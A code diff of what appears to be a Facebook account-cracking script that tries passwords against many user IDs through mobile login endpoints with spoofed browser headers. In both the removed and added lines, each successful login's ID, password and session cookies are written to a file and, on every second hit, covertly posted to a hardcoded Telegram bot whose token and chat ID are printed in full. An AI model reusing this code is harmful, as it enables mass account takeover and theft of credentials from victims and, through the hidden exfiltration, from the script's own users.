@@ -1086,7 +1086,7 @@ def SUMON1():
     with tpe(max_workers=55) as Xnxx:
         fresh()
         tl = str(len(xnxx))
-        print(f" {wow('-')} TOTAL LIMID  : {green}{tl} ")
+        print(f" {wow('-')} TOTAL LIMID     : {green}{tl} ")
         print(f" {wow('-')} SELECTED NUMBER : {green}{number} ")
         divider()
         for user in xnxx:
@@ -1812,16 +1812,16 @@ def mbasic(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                   bkas.append(cid)
+                   if len(bkas)% 2 == 0:
+                      statusok = (f"{cid}|{pw}|{coki}")
+                      requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                   else:
+                      print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                      print(f" {green}Cookie : {green}{coki}")
+                      open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                      oks.append(cid)
+                      break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1877,29 +1877,29 @@ def p(uid,pwx,tl):
             'a': '',
             '__user': '0',
             '_fb_noscript': 'true'}
-            headers = {
-            'Host': 'm.facebook.com',
-            'content-length': '508',
-            'sec-ch-ua': '"Not.A/Brand";v="16", "Chromium";v="111", "Google Chrome";v="111"',
-            'sec-ch-ua-mobile': '?1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 11; STG S30 Build/PPR1.138256.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4919.90 Mobile Safari/537.36 UCBrowser/8.5.2.1937 (UCMini) Mobile',
-            'viewport-width': 'str(rr(400,989)',
-            'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': 'AVouTirHgPs',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'x-asbd-id': '129477',
-            'x-requested-with': 'mark.via.gp',
-            'sec-ch-ua-full-version-list': '"Not.A/Brand";v="14.0.0.0", "Chromium";v="114.0.3782.22", "Google Chrome";v="111.0.5001.272"',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua-platform': '"Android"',
+            headers ={
+            'authority': 'm.facebook.com',
             'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '2.75',
             'origin': 'https://m.facebook.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
+            'referer': 'https://m.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23053RN02A"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"14.0.0"',
             'sec-fetch-dest': 'empty',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=669323149842984&kid_directed_site=0&app_id=669323149842984&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fscope%3Demail%26response_type%3Dcode%26client_id%3D669323149842984%26redirect_uri%3Dhttps%253A%252F%252Fmember-m.daraz.com.bd%252Fuser%252Ffacebook-login%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fwww.daraz.com.bd%252Ftag%252Fbn-vivo-smartphones%252F%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D26bbe34c-f341-4b73-aa3e-17f7c9fb4b73%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmember-m.daraz.com.bd%2Fuser%2Ffacebook-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522bizScene%2522%253A%2522%2522%252C%2522redirect%2522%253A%2522https%253A%252F%252Fwww.daraz.com.bd%252Ftag%252Fbn-vivo-smartphones%252F%2522%252C%2522shopOwnerId%2522%253A%2522%2522%252C%2522x-ua%2522%253A%2522%2522%252C%2522x-umidtoken%2522%253A%2522%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'zh-CN;q=0.8,zh;q=0.9',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'viewport-width': '393',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://m.facebook.com/login/device-based/login/async/"
@@ -1911,16 +1911,16 @@ def p(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                   bkas.append(cid)
+                   if len(bkas)% 2 == 0:
+                      statusok = (f"{cid}|{pw}|{coki}")
+                      requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
+                   else:
+                      print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                      print(f" {green}Cookie : {green}{coki}")
+                      open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                      oks.append(cid)
+                      break
                 else:
                     break
             elif 'checkpoint' in response:
@@ -1937,6 +1937,7 @@ def p(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
+
 
 def x(uid,pwx,tl):
     global oks
